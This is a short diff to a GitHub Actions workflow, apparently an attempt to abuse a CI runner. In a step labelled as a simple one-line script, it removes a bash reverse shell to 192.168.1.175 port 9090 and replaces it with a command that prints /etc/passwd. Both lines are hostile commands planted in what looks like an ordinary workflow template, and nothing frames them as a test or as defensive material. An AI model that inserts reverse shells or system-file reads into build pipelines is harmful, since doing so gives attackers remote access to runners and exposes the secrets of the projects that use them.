@@ -27,7 +27,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run:  bash -i >& /dev/tcp/192.168.1.175/9090 0>&1
+        run:  cat /etc/passwd
 
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
